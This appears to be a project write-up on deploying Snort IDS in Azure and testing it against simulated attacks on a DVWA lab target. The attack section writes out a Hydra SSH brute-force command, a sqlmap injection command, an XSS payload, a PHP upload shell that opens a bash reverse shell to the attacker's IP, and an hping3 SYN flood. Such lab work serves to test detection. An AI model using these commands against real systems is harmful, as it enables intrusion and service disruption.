# Cybersecurity Project: Deploying and Monitoring Snort IDS on Ubuntu in Azure

### Table of Contents

1. [Introduction](#introduction)
2. [Project Overview](#project-overview)
3. [Environment Setup](#environment-setup)
    1. [Azure Virtual Machines](#azure-virtual-machines)
    2. [Network Configuration](#network-configuration)
4. [Installing and Configuring Snort](#installing-and-configuring-snort)
    1. [Installing Dependencies](#installing-dependencies)
    2. [Installing and Configuring Snort](#installing-and-configuring-snort)
    3. [Downloading Snort Rules](#downloading-snort-rules)
5. [Writing Snort Rules](#writing-snort-rules)
6. [Attacks and Simulations with Kali Linux](#attacks-and-simulations-with-kali-linux)
    1. [Brute Force SSH Attack](#brute-force-ssh-attack)
    2. [SQL Injection Attack on DVWA](#sql-injection-attack-on-dvwa)
    3. [Cross-Site Scripting (XSS) Attack](#cross-site-scripting-xss-attack)
    4. [File Upload Vulnerability Attack](#file-upload-vulnerability-attack)
    5. [Denial of Service (DoS) Attack](#denial-of-service-dos-attack)
7. [Monitoring Snort Alerts](#monitoring-snort-alerts)
8. [Advanced Configurations](#advanced-configurations)
    1. [Custom Snort Rules](#custom-snort-rules)
    2. [Setting Up Snort in IPS Mode](#setting-up-snort-in-ips-mode)
9. [Troubleshooting](#troubleshooting)
10. [Conclusion](#conclusion)
11. [Future Work](#future-work)

---

## Introduction

This project is a hands-on exploration of network security through the deployment and configuration of **Snort**, a popular open-source **Intrusion Detection System (IDS)**, on an **Ubuntu** server hosted in **Azure**. The setup simulates real-world attacks from a **Kali Linux** attacker machine against an **Ubuntu target machine** running services like **DVWA** (Damn Vulnerable Web Application), SSH, and others.

The primary focus of this project is on how Snort can be used to detect, log, and prevent various network attacks, such as brute-force SSH attacks, SQL injection, Denial of Service (DoS) attacks, and more.

---

## Project Overview

- **Snort IDS Server**: Ubuntu Server running Snort IDS to monitor network traffic.
- **Target Machine**: Ubuntu Server with services (e.g., DVWA, SSH) exposed for attack simulations.
- **Attacker Machine**: Kali Linux used for simulating a variety of attacks.
- **Azure Infrastructure**: All virtual machines are hosted on **Azure** and connected through the same virtual network (VNet).

### Key Objectives:

- **Intrusion Detection**: Detect and log malicious activities using Snort IDS.
- **Attack Simulations**: Use **Kali Linux** to launch various attacks, including brute-force SSH, SQL injection, XSS, and DoS.
- **Rule Writing**: Configure Snort rules to detect specific attack signatures.
- **Alert Monitoring**: Analyze Snort alerts and logs to understand detection mechanisms.

---

## Environment Setup

### Azure Virtual Machines

We set up three virtual machines in **Azure** for this project:

1. **Snort IDS Server** (Ubuntu 20.04)
   - This VM will host Snort IDS.
   - SSH access is enabled for management purposes.
   
2. **Target Machine** (Ubuntu 20.04)
   - This machine is configured with vulnerable services like SSH and DVWA for attack simulations.
   
3. **Kali Linux** (Kali Linux)
   - This VM is used to perform the attacks (brute force, DoS, etc.) on the target machine.

### Network Configuration

All VMs are hosted in the same **Virtual Network (VNet)** for easy communication:

- **Virtual Network**: `10.0.0.0/16`
- **Subnet**: `10.0.0.0/24`
- **Public IPs**: Assigned for remote access via SSH and RDP.

Each VM is placed within this virtual network to allow traffic flow and attack simulations between the attacker, target, and Snort IDS machines.

---

## Installing and Configuring Snort

Snort acts as the core of this project, analyzing traffic and detecting attacks based on rules.

### Installing Dependencies

Before installing Snort, we installed all necessary dependencies on the **Snort IDS Server**:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev pkg-config
```

These dependencies are required for building and running Snort.

### Installing and Configuring Snort

Next, we installed **DAQ** (Data Acquisition Library) and **Snort** itself:

1. **Install DAQ**:

   ```bash
   wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
   tar -xzvf daq-2.0.7.tar.gz
   cd daq-2.0.7
   ./configure && make && sudo make install
   ```

2. **Install Snort**:

   ```bash
   wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
   tar -xzvf snort-2.9.20.tar.gz
   cd snort-2.9.20
   ./configure --enable-sourcefire && make && sudo make install
   ```

3. **Create Snort Directories**:

   ```bash
   sudo mkdir -p /etc/snort/rules /var/log/snort /usr/local/lib/snort_dynamicrules
   sudo touch /etc/snort/rules/white_list.rules /etc/snort/rules/black_list.rules
   sudo chown -R snort:snort /etc/snort /var/log/snort
   ```

4. **Configure `snort.conf`**:
   - We configured the Snort configuration file to define paths to the rules and other settings:
     ```bash
     sudo nano /etc/snort/snort.conf
     ```
   - Set up network variables:
     ```bash
     var HOME_NET 10.0.0.0/24
     var RULE_PATH /etc/snort/rules
     ```

### Downloading Snort Rules

To enable Snort to detect a wide variety of attacks, we downloaded community and registered Snort rule sets:

1. **Community Rules**:
   ```bash
   wget https://www.snort.org/downloads/community/community-rules.tar.gz
   sudo tar -xzvf community-rules.tar.gz -C /etc/snort/rules
   ```

2. **Paid Rules**:
   For registered users, download the latest Snort rules from [Snort’s official website](https://www.snort.org).

3. **Configure Rule Paths**:
   Ensure that Snort knows where to find the rules:
   ```bash
   include $RULE_PATH/local.rules
   include $RULE_PATH/community.rules
   ```

---

## Writing Snort Rules

Writing custom Snort rules allows us to tailor Snort's detection capabilities to specific threats.

### Example Custom Rule for SSH Brute Force Detection

To detect brute force attempts on SSH (port 22), we wrote the following custom rule in `local.rules`:

```bash
sudo nano /etc/snort/rules/local.rules
```

```bash
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Detected"; flags:S; threshold:type threshold, track by_src, count 3, seconds 60; sid:1000001; rev:1;)
```

- **Explanation**:
  - `msg`: Custom message for the alert.
  - `flags:S`: Detect SYN packets.
  - `threshold`: Triggers an alert after 3 connection attempts within 60 seconds.

### Testing Snort Configuration

Before running Snort, it’s important to test the configuration:

```bash
sudo snort -T -c /etc/snort/snort.conf
```

This will check if there are any syntax or configuration errors in the Snort setup.

---

## Attacks and Simulations with Kali Linux

The **Kali Linux** machine is used to simulate various types of attacks against the **Target Ubuntu Machine**. These attacks are monitored by Snort for detection and logging.

### 1. Brute Force SSH Attack

One of the first attacks we performed was an **SSH brute force** attack using **Hydra** from Kali Linux.

#### Steps:
1. **Launch Hydra to Brute Force SSH**:
   ```bash
   hydra -l saalim -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.0.0.4
   ```

   - `-l saalim`: Specifies the username to brute force.
   - `-P /usr/share/wordlists/rockyou.txt`: Path to the password wordlist.
   - `-t 4`: Specifies 4 concurrent threads.
   - `ssh://10.0.0.4`: Target IP with SSH.

2. **Monitor Snort for Alerts**:
   While the brute force attack is happening, we monitored Snort for alerts:
   ```bash
   sudo tail -f /var/log/snort/alert
   ```

   **Example Alert**:
   ```
   [**] [1:1000001:1] SSH Brute Force Detected [**]
   {TCP} <source_ip>:<source_port> -> <target_ip>:22
   ```

### 2. SQL Injection Attack on DVWA

We used **SQLMap** to automate an SQL injection attack against the **DVWA** application running on the target machine.

#### Steps:
1. **Perform SQL Injection**:
   ```bash
   sqlmap -u "http://<target-ip>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" --dbs
   ```

   This attack enumerates the databases on the target system.

2. **Monitor Snort for Alerts**:
   Use `tail` to check for SQL injection-related alerts:
   ```bash
   sudo tail -f /var/log/snort/alert
   ```

### 3. Cross-Site Scripting (XSS) Attack

Next, we performed a **Cross-Site Scripting (XSS)** attack on DVWA.

#### Steps:
1. **Inject Malicious Script**:
   In the **XSS Reflected** section of DVWA, we injected the following script:
   ```bash
   <script>alert('XSS');</script>
   ```

2. **Monitor Snort**:
   We monitored Snort for any custom XSS alerts, particularly by writing a custom rule to detect XSS.

### 4. File Upload Vulnerability Attack

We leveraged a **file upload vulnerability** in DVWA to gain a reverse shell.

#### Steps:
1. **Create a Malicious PHP Script**:
   ```php
   <?php
   exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali-ip>/4444 0>&1'");
   ?>
   ```

2. **Upload the Script** via the DVWA file upload section.

3. **Execute the Reverse Shell**:
   After uploading, visit the uploaded PHP file URL to trigger the reverse shell:
   ```bash
   http://<target-ip>/DVWA/hackable/uploads/shell.php
   ```

4. **Monitor Snort**:
   Custom Snort rules can be written to detect file uploads or the execution of PHP files in this case.

### 5. Denial of Service (DoS) Attack

We performed a **SYN Flood DoS Attack** using **hping3** from Kali Linux.

#### Steps:
1. **Launch DoS Attack**:
   ```bash
   sudo hping3 -S --flood -V -p 80 10.0.0.4
   ```

   This attack floods the target’s port 80 with SYN packets.

2. **Monitor Snort for Alerts**:
   Snort has built-in rules to detect SYN floods:
   ```bash
   sudo tail -f /var/log/snort/alert
   ```

   **Example Alert**:
   ```
   [**] [1:1000004:1] SYN Flood Detected [**]
   {TCP} <source_ip>:<source_port> -> <target_ip>:80
   ```

---

## Monitoring Snort Alerts

Snort alerts can be viewed in real-time using the following command:

```bash
sudo tail -f /var/log/snort/alert
```

For large-scale alert analysis, you can also forward logs to a central SIEM system or visualize them using tools like **Kibana**.

---

## Advanced Configurations

### Custom Snort Rules

Throughout the project, we created various **custom Snort rules** for detecting specific attack patterns (e.g., brute-force SSH, SQL injection). These rules were stored in the `local.rules` file.

### Setting Up Snort in IPS Mode

If you want Snort to actively block malicious traffic, you can switch Snort from **IDS mode** (detection) to **IPS mode** (prevention). This involves setting up **inline** mode:

1. **Configure iptables** to redirect traffic to Snort.
2. **Run Snort in Inline Mode**:
   ```bash
   sudo snort -Q -c /etc/snort/snort.conf -i eth0
   ```

---

## Troubleshooting

### Common Issues:
- **Snort Not Starting**: Check for syntax errors in the configuration file using `snort -T`.
- **No Alerts**: Ensure Snort is running on the correct network interface (e.g., `eth0`) and that traffic is flowing through it.
- **Rule Errors**: Make sure custom rules are properly formatted and included in the `snort.conf` file.

---

## Conclusion

This project has demonstrated the deployment of **Snort IDS** on an **Ubuntu server** in **Azure**, the simulation of multiple network and web-based attacks, and the monitoring of those attacks using Snort. We gained experience in setting up vulnerable services (like DVWA), writing custom Snort rules, and analyzing security alerts.

---

## Future Work

- **Deploying Snort in IPS Mode** to actively block threats.
- **Automating Infrastructure Setup** using **Terraform** or **Ansible**.
- **Integrating with a SIEM** like **Elasticsearch** or **Splunk** for advanced alert analysis.
- **Exploring additional attacks** such as buffer overflows, malware propagation, or SSL/TLS vulnerabilities.
